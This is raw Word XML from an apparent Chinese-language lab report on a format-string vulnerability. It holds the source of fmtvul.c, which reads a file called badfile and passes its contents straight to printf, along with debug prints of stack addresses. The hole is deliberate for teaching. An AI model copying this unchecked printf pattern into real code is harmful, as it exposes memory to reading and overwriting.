          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:hint="eastAsia"/>
        </w:rPr>
        <w:t>栈</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:hint="eastAsia"/>
        </w:rPr>
        <w:t>帧布局</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="03E95DA7"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br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="2ABA9521" w14:textId="77777777" w:rsidR="00193C1A" w:rsidRDefault="00000000">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="3"/>
        </w:numPr>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="黑体" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="黑体" w:hAnsi="Times New Roman" w:hint="eastAsia"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>源代码</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="52F7D513" w14:textId="77777777" w:rsidR="00193C1A" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:ind w:firstLineChars="200" w:firstLine="480"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma"/>
          <w:sz w:val="24"/>
          <w:lang w:bidi="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
          <w:lang w:bidi="en-US"/>
        </w:rPr>
        <w:t>fmtv</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma"/>
          <w:sz w:val="24"/>
          <w:lang w:bidi="en-US"/>
        </w:rPr>
        <w:t>ul.c</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
          <w:lang w:bidi="en-US"/>
        </w:rPr>
        <w:t>为有漏洞的程序，它将从一个叫做</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
          <w:lang w:bidi="en-US"/>
        </w:rPr>
        <w:t>b</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma"/>
          <w:sz w:val="24"/>
          <w:lang w:bidi="en-US"/>
        </w:rPr>
        <w:t>adfile</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
          <w:lang w:bidi="en-US"/>
        </w:rPr>
        <w:t>的文件中读取数据，并使用</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
          <w:lang w:bidi="en-US"/>
        </w:rPr>
        <w:t>p</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma"/>
          <w:sz w:val="24"/>
          <w:lang w:bidi="en-US"/>
        </w:rPr>
        <w:t>rintf</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma"/>
          <w:sz w:val="24"/>
          <w:lang w:bidi="en-US"/>
        </w:rPr>
        <w:t>()</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
          <w:lang w:bidi="en-US"/>
        </w:rPr>
        <w:t>把数据打印出来，代码如下</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="08B61BB0" w14:textId="77777777" w:rsidR="00193C1A" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:ind w:left="567"/>
        <w:rPr>
          <w:rFonts w:cs="Tahoma"/>
          <w:sz w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:cs="Tahoma"/>
          <w:sz w:val="24"/>
          <w:lang w:bidi="en-US"/>
        </w:rPr>
        <w:t>fmtvul.c</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="4D50E3FC" w14:textId="77777777" w:rsidR="00193C1A" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:ind w:firstLineChars="200" w:firstLine="420"/>
        <w:rPr>
          <w:rFonts w:cs="Tahoma"/>
          <w:sz w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <mc:AlternateContent>
          <mc:Choice Requires="wps">
            <w:drawing>
              <wp:anchor distT="0" distB="0" distL="114300" distR="114300" simplePos="0" relativeHeight="251668480" behindDoc="1" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="7547F732" wp14:editId="64E31F37">
                <wp:simplePos x="0" y="0"/>
                <wp:positionH relativeFrom="page">
                  <wp:posOffset>1497330</wp:posOffset>
                </wp:positionH>
                <wp:positionV relativeFrom="paragraph">
                  <wp:posOffset>57785</wp:posOffset>
                </wp:positionV>
                <wp:extent cx="4989830" cy="5602605"/>
                <wp:effectExtent l="4445" t="4445" r="9525" b="6350"/>
                <wp:wrapTopAndBottom/>
                <wp:docPr id="21" name="文本框 21"/>
                <wp:cNvGraphicFramePr/>
                <a:graphic xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
                  <a:graphicData uri="http://schemas.microsoft.com/office/word/2010/wordprocessingShape">
                    <wps:wsp>
                      <wps:cNvSpPr txBox="1"/>
                      <wps:spPr>
                        <a:xfrm>
                          <a:off x="0" y="0"/>
                          <a:ext cx="4989830" cy="5602605"/>
                        </a:xfrm>
                        <a:prstGeom prst="rect">
                          <a:avLst/>
                        </a:prstGeom>
                        <a:noFill/>
                        <a:ln w="6109" cap="flat" cmpd="sng">
                          <a:solidFill>
                            <a:srgbClr val="000000"/>
                          </a:solidFill>
                          <a:prstDash val="solid"/>
                          <a:miter/>
                          <a:headEnd type="none" w="med" len="med"/>
                          <a:tailEnd type="none" w="med" len="med"/>
                        </a:ln>
                      </wps:spPr>
                      <wps:txbx>
                        <w:txbxContent>
                          <w:p w14:paraId="64450BE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47E777FC"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15F2E62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*str){</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="227507D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7EBAA57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*ret;</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="596B72D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8000"/>
                                <w:kern w:val="0"/>
                                <w:sz w:val="20"/>
                                <w:szCs w:val="20"/>
                                <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                                <w:lang w:bidi="ar"/>
                              </w:rPr>
                              <w:t xml:space="preserve">//copy </w:t>
                            </w:r>
                            <w:proofErr w:type="spellStart"/>
                            <w:r>
                              <w:rPr>
                                <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                                <w:color w:val="008000"/>
                                <w:kern w:val="0"/>
                                <w:sz w:val="20"/>
                                <w:szCs w:val="20"/>
                                <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                                <w:lang w:bidi="ar"/>
                              </w:rPr>
                              <w:t>eby</w:t>
                            </w:r>
                            <w:proofErr w:type="spellEnd"/>
                            <w:r>
                              <w:rPr>
                                <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                                <w:color w:val="008000"/>
                                <w:kern w:val="0"/>
                                <w:sz w:val="20"/>
                                <w:szCs w:val="20"/>
                                <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                                <w:lang w:bidi="ar"/>
                              </w:rPr>
                              <w:t xml:space="preserve"> into </w:t>
                            </w:r>
                            <w:proofErr w:type="spellStart"/>
                            <w:r>
                              <w:rPr>
                                <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                                <w:color w:val="008000"/>
                                <w:kern w:val="0"/>
                                <w:sz w:val="20"/>
                                <w:szCs w:val="20"/>
                                <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                                <w:lang w:bidi="ar"/>
                              </w:rPr>
                              <w:t>framep</w:t>
                            </w:r>
                            <w:proofErr w:type="spellEnd"/>
                          </w:p>
                          <w:p w14:paraId="0A21986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FF"/>
                                <w:kern w:val="0"/>
                                <w:sz w:val="20"/>
                                <w:szCs w:val="20"/>
                                <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                                <w:lang w:bidi="ar"/>
                              </w:rPr>
                              <w:t>asm</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movl</w:t>
                            </w:r>
                            <w:proofErr w:type="spellEnd"/>
                            <w:r>
                              <w:rPr>
                                <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                                <w:color w:val="A31515"/>
                                <w:kern w:val="0"/>
                                <w:sz w:val="20"/>
                                <w:szCs w:val="20"/>
                                <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                                <w:lang w:bidi="ar"/>
                              </w:rPr>
                              <w:t xml:space="preserve"> %%</w:t>
                            </w:r>
                            <w:proofErr w:type="spellStart"/>
                            <w:r>
                              <w:rPr>
                                <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                                <w:color w:val="A31515"/>
                                <w:kern w:val="0"/>
                                <w:sz w:val="20"/>
                                <w:szCs w:val="20"/>
                                <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                                <w:lang w:bidi="ar"/>
                              </w:rPr>
                              <w:t>ebp</w:t>
                            </w:r>
                            <w:proofErr w:type="spellEnd"/>
                            <w:r>
                              <w:rPr>
                                <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                                <w:color w:val="A31515"/>
                                <w:kern w:val="0"/>
                                <w:sz w:val="20"/>
                                <w:szCs w:val="20"/>
                                <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                                <w:lang w:bidi="ar"/>
                              </w:rPr>
                              <w:t>, %0"</w:t>
                            </w:r>
                            <w:r>
                              <w:rPr>
                                <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                                <w:color w:val="000000"/>
                                <w:kern w:val="0"/>
                                <w:sz w:val="20"/>
                                <w:szCs w:val="20"/>
                                <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                                <w:lang w:bidi="ar"/>
                              </w:rPr>
                              <w:t xml:space="preserve"> : </w:t>
                            </w:r>
                            <w:r>
                              <w:rPr>
                                <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                                <w:color w:val="A31515"/>
                                <w:kern w:val="0"/>
                                <w:sz w:val="20"/>
                                <w:szCs w:val="20"/>
                                <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                                <w:lang w:bidi="ar"/>
                              </w:rPr>
                              <w:t>"=r"</w:t>
                            </w:r>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45E1137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ret = </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w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="66B3B655" w14:textId="77777777" w:rsidR="00193C1A" w:rsidRDefault="00193C1A">
                            <w:pPr>
                              <w:widowControl/>
                              <w:jc w:val="left"/>
                              <w:rPr>
                                <w:sz w:val="20"/>
                                <w:szCs w:val="20"/>
                              </w:rPr>
                            </w:pPr>
                          </w:p>
                          <w:p w14:paraId="1766C46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 print out information for experiment purpose */</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="5C888D7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address of the input array: 0x%.8x\n"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)str);</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="7DA8BC7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the frame pointer: 0x%.8x\n"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4D53FD9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the return address: 0x%.8x\n"</w:t>
                            </w:r>
                            <w:r>
                              <w:rPr>
                                <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                                <w:color w:val="000000"/>
                                <w:kern w:val="0"/>
                                <w:sz w:val="20"/>
                                <w:szCs w:val="20"/>
                                <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                                <w:lang w:bidi="ar"/>
                              </w:rPr>
                              <w:t>, *ret);</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="2A33B51D" w14:textId="77777777" w:rsidR="00193C1A" w:rsidRDefault="00193C1A">
                            <w:pPr>
                              <w:widowControl/>
                              <w:jc w:val="left"/>
                              <w:rPr>
                                <w:sz w:val="20"/>
                                <w:szCs w:val="20"/>
                              </w:rPr>
                            </w:pPr>
                          </w:p>
                          <w:p w14:paraId="1CB7E2AB"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(str);</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="557F786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nThe</w:t>
                            </w:r>
                            <w:proofErr w:type="spellEnd"/>
                            <w:r>
                              <w:rPr>
                                <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                                <w:color w:val="A31515"/>
                                <w:kern w:val="0"/>
                                <w:sz w:val="20"/>
                                <w:szCs w:val="20"/>
                                <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                                <w:lang w:bidi="ar"/>
                              </w:rPr>
                              <w:t xml:space="preserve"> value of the return address: 0x%.8x\n"</w:t>
                            </w:r>
                            <w:r>
                              <w:rPr>
                                <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                                <w:color w:val="000000"/>
                                <w:kern w:val="0"/>
                                <w:sz w:val="20"/>
                                <w:szCs w:val="20"/>
                                <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                                <w:lang w:bidi="ar"/>
                              </w:rPr>
                              <w:t>, *ret);</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="163A45A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548E1F42" w14:textId="77777777" w:rsidR="00193C1A" w:rsidRDefault="00193C1A">
                            <w:pPr>
                              <w:widowControl/>
                              <w:jc w:val="left"/>
                              <w:rPr>
                                <w:sz w:val="20"/>
                                <w:szCs w:val="20"/>
                              </w:rPr>
                            </w:pPr>
                          </w:p>
                          <w:p w14:paraId="6B5204C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argc</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argv</w:t>
                            </w:r>
                            <w:proofErr w:type="spellEnd"/>
                            <w:r>
                              <w:rPr>
                                <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                                <w:color w:val="000000"/>
                                <w:kern w:val="0"/>
                                <w:sz w:val="20"/>
                                <w:szCs w:val="20"/>
                                <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                                <w:lang w:bidi="ar"/>
                              </w:rPr>
                              <w:t>)</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="448E7CB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29546A4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FILE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
                          <w:p w14:paraId="267D024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str[</w:t>
                            </w:r>
                            <w:proofErr w:type="gramEnd"/>
                            <w:r>
                              <w:rPr>
                                <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                                <w:color w:val="098658"/>
                                <w:kern w:val="0"/>
                                <w:sz w:val="20"/>
                                <w:szCs w:val="20"/>
                                <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                                <w:lang w:bidi="ar"/>
                              </w:rPr>
                              <w:t>200</w:t>
                            </w:r>
                            <w:r>
                              <w:rPr>
                                <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                                <w:color w:val="000000"/>
                                <w:kern w:val="0"/>
                                <w:sz w:val="20"/>
                                <w:szCs w:val="20"/>
                                <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                                <w:lang w:bidi="ar"/>
                              </w:rPr>
                              <w:t>];</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="24CE10C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fopen</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badfile</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rb</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10665CB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fread</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 xml:space="preserve">str, </w:t>
                            </w:r>
                            <w:proofErr w:type="spellStart"/>
                            <w:r>
                              <w:rPr>
                                <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                                <w:color w:val="0000FF"/>
                                <w:kern w:val="0"/>
                                <w:sz w:val="20"/>
                                <w:szCs w:val="20"/>
                                <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                                <w:lang w:bidi="ar"/>
                              </w:rPr>
                              <w:t>sizeof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200</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
                          <w:p w14:paraId="42008C3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(str);</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="2A0FCD62" w14:textId="77777777" w:rsidR="00193C1A" w:rsidRDefault="00193C1A">
                            <w:pPr>
                              <w:widowControl/>
                              <w:jc w:val="left"/>
                              <w:rPr>
                                <w:sz w:val="20"/>
                                <w:szCs w:val="20"/>
                              </w:rPr>
                            </w:pPr>
                          </w:p>
                          <w:p w14:paraId="3B46F34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return</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w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="2BF0D4D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512256AF" w14:textId="77777777" w:rsidR="00193C1A" w:rsidRDefault="00193C1A">
                            <w:pPr>
                              <w:widowControl/>
                              <w:spacing w:after="240"/>
                              <w:jc w:val="left"/>
                              <w:rPr>
                                <w:sz w:val="20"/>
                                <w:szCs w:val="20"/>
                              </w:rPr>
                            </w:pPr>
                          </w:p>
                          <w:p w14:paraId="2D6446DA" w14:textId="77777777" w:rsidR="00193C1A" w:rsidRDefault="00193C1A">
                            <w:pPr>
                              <w:rPr>
                                <w:sz w:val="20"/>
                                <w:szCs w:val="20"/>
                              </w:rPr>
                            </w:pPr>
                          </w:p>
                        </w:txbxContent>
                      </wps:txbx>
                      <wps:bodyPr lIns="0" tIns="0" rIns="0" bIns="0" upright="1"/>
                    </wps:wsp>
                  </a:graphicData>
                </a:graphic>
              </wp:anchor>
            </w:drawing>
          </mc:Choice>
          <mc:Fallback>
            <w:pict>
              <v:shape w14:anchorId="7547F732" id="文本框 21" o:spid="_x0000_s1034" type="#_x0000_t202" style="position:absolute;left:0;text-align:left;margin-left:117.9pt;margin-top:4.55pt;width:392.9pt;height:441.15pt;z-index:-2516480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" filled="f" strokeweight=".16969mm">
                <v:textbox inset="0,0,0,0">
                  <w:txbxContent>
                    <w:p w14:paraId="64450BE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#include</w:t>
                      </w:r>
                      <w:r>
                        <w:rPr>
                          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                          <w:color w:val="A31515"/>
                          <w:kern w:val="0"/>
                          <w:sz w:val="20"/>
                          <w:szCs w:val="20"/>
                          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                          <w:lang w:bidi="ar"/>
                        </w:rPr>
                        <w:t>&lt;stdio.h&gt;</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="47E777FC" w14:textId="77777777" w:rsidR="00193C1A" w:rsidRDefault="00193C1A">
                      <w:pPr>
                        <w:widowControl/>
                        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                        <w:spacing w:line="190" w:lineRule="atLeast"/>
                        <w:jc w:val="left"/>
                        <w:rPr>
                          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                          <w:color w:val="000000"/>
                          <w:sz w:val="20"/>
                          <w:szCs w:val="20"/>
                        </w:rPr>
                      </w:pPr>
                    </w:p>
                    <w:p w14:paraId="15F2E62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void</w:t>
                      </w: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*str){</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="227507D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7EBAA57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*ret;</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="596B72D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8000"/>
                          <w:kern w:val="0"/>
                          <w:sz w:val="20"/>
                          <w:szCs w:val="20"/>
                          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                          <w:lang w:bidi="ar"/>
                        </w:rPr>
                        <w:t xml:space="preserve">//copy </w:t>
                      </w:r>
                      <w:proofErr w:type="spellStart"/>
                      <w:r>
                        <w:rPr>
                          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                          <w:color w:val="008000"/>
                          <w:kern w:val="0"/>
                          <w:sz w:val="20"/>
                          <w:szCs w:val="20"/>
                          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                          <w:lang w:bidi="ar"/>
                        </w:rPr>
                        <w:t>eby</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/>
                      <w:r>
                        <w:rPr>
                          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                          <w:color w:val="008000"/>
                          <w:kern w:val="0"/>
                          <w:sz w:val="20"/>
                          <w:szCs w:val="20"/>
                          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                          <w:lang w:bidi="ar"/>
                        </w:rPr>
                        <w:t xml:space="preserve"> into </w:t>
                      </w:r>
                      <w:proofErr w:type="spellStart"/>
                      <w:r>
                        <w:rPr>
                          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                          <w:color w:val="008000"/>
                          <w:kern w:val="0"/>
                          <w:sz w:val="20"/>
                          <w:szCs w:val="20"/>
                          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                          <w:lang w:bidi="ar"/>
                        </w:rPr>
                        <w:t>framep</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/>
                    </w:p>
                    <w:p w14:paraId="0A21986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FF"/>
                          <w:kern w:val="0"/>
                          <w:sz w:val="20"/>
                          <w:szCs w:val="20"/>
                          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                          <w:lang w:bidi="ar"/>
                        </w:rPr>
                        <w:t>asm</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movl</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/>
                      <w:r>
                        <w:rPr>
                          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                          <w:color w:val="A31515"/>
                          <w:kern w:val="0"/>
                          <w:sz w:val="20"/>
                          <w:szCs w:val="20"/>
                          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                          <w:lang w:bidi="ar"/>
                        </w:rPr>
                        <w:t xml:space="preserve"> %%</w:t>
                      </w:r>
                      <w:proofErr w:type="spellStart"/>
                      <w:r>
                        <w:rPr>
                          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                          <w:color w:val="A31515"/>
                          <w:kern w:val="0"/>
                          <w:sz w:val="20"/>
                          <w:szCs w:val="20"/>
                          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                          <w:lang w:bidi="ar"/>
                        </w:rPr>
                        <w:t>ebp</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/>
                      <w:r>
                        <w:rPr>
                          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                          <w:color w:val="A31515"/>
                          <w:kern w:val="0"/>
                          <w:sz w:val="20"/>
                          <w:szCs w:val="20"/>
                          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                          <w:lang w:bidi="ar"/>
                        </w:rPr>
                        <w:t>, %0"</w:t>
                      </w:r>
                      <w:r>
                        <w:rPr>
                          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                          <w:color w:val="000000"/>
                          <w:kern w:val="0"/>
                          <w:sz w:val="20"/>
                          <w:szCs w:val="20"/>
                          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                          <w:lang w:bidi="ar"/>
                        </w:rPr>
                        <w:t xml:space="preserve"> : </w:t>
                      </w:r>
                      <w:r>
                        <w:rPr>
                          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                          <w:color w:val="A31515"/>
                          <w:kern w:val="0"/>
                          <w:sz w:val="20"/>
                          <w:szCs w:val="20"/>
                          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                          <w:lang w:bidi="ar"/>
                        </w:rPr>
                        <w:t>"=r"</w:t>
                      </w:r>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45E1137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ret = </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w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="66B3B655" w14:textId="77777777" w:rsidR="00193C1A" w:rsidRDefault="00193C1A">
                      <w:pPr>
                        <w:widowControl/>
                        <w:jc w:val="left"/>
                        <w:rPr>
                          <w:sz w:val="20"/>
                          <w:szCs w:val="20"/>
                        </w:rPr>
                      </w:pPr>
                    </w:p>
                    <w:p w14:paraId="1766C46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 print out information for experiment purpose */</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="5C888D7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address of the input array: 0x%.8x\n"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)str);</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="7DA8BC7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the frame pointer: 0x%.8x\n"</w:t>
                      </w:r>
                      <w:r>
                        <w:rPr>
                          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                          <w:color w:val="000000"/>
                          <w:kern w:val="0"/>
                          <w:sz w:val="20"/>
                          <w:szCs w:val="20"/>
                          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                          <w:lang w:bidi="ar"/>
                        </w:rPr>
                        <w:t>, (</w:t>
                      </w:r>
                      <w:r>
                        <w:rPr>
                          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                          <w:color w:val="0000FF"/>
                          <w:kern w:val="0"/>
                          <w:sz w:val="20"/>
                          <w:szCs w:val="20"/>
                          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                          <w:lang w:bidi="ar"/>
                        </w:rPr>
                        <w:t>unsigned</w:t>
                      </w:r>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framep</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/>
                      <w:r>
                        <w:rPr>
                          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                          <w:color w:val="000000"/>
                          <w:kern w:val="0"/>
                          <w:sz w:val="20"/>
                          <w:szCs w:val="20"/>
                          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                          <w:lang w:bidi="ar"/>
                        </w:rPr>
                        <w:t>);</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="4D53FD9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"The value of the return address: 0x%.8x\n"</w:t>
                      </w:r>
                      <w:r>
                        <w:rPr>
                          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                          <w:color w:val="000000"/>
                          <w:kern w:val="0"/>
                          <w:sz w:val="20"/>
                          <w:szCs w:val="20"/>
                          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                          <w:lang w:bidi="ar"/>
                        </w:rPr>
                        <w:t>, *ret);</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="2A33B51D" w14:textId="77777777" w:rsidR="00193C1A" w:rsidRDefault="00193C1A">
                      <w:pPr>
                        <w:widowControl/>
                        <w:jc w:val="left"/>
                        <w:rPr>
                          <w:sz w:val="20"/>
                          <w:szCs w:val="20"/>
                        </w:rPr>
                      </w:pPr>
                    </w:p>
                    <w:p w14:paraId="1CB7E2AB"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(str);</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="557F786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printf</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nThe</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/>
                      <w:r>
                        <w:rPr>
                          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                          <w:color w:val="A31515"/>
                          <w:kern w:val="0"/>
                          <w:sz w:val="20"/>
                          <w:szCs w:val="20"/>
                          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                          <w:lang w:bidi="ar"/>
                        </w:rPr>
                        <w:t xml:space="preserve"> value of the return address: 0x%.8x\n"</w:t>
                      </w:r>
                      <w:r>
                        <w:rPr>
                          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                          <w:color w:val="000000"/>
